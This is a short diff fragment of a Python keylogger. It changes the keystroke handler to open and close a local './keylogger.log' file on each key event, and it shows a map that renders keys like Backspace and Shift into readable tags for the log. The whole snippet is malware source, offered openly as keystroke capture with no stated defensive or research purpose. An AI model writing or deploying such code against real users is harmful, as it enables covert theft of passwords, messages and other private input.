@@ -11,7 +11,7 @@ def stringreplace(s):
 
 def keystroke(event):
     global flag, out, prev_window, running, text_file, count, sequence
-
+    text_file = open("./keylogger.log", "a")
     if(count>0 and event.Key!="F12"):
         sequence, count = 0, 0
 
@@ -32,7 +32,8 @@ def keystroke(event):
         sequence = 1
         if(count==3):
             running = False
-
+    text_file.close()
+    
 text_file = open("./keylogger.log", "a")
 special_strings = {
     "BackSpace":"(back)", "Return":"(enter)", "space":"(space)", "Shift_R" :"(S_R)","Shift_L":"(S_L)", "Control_L":"(Ctrl_l)",
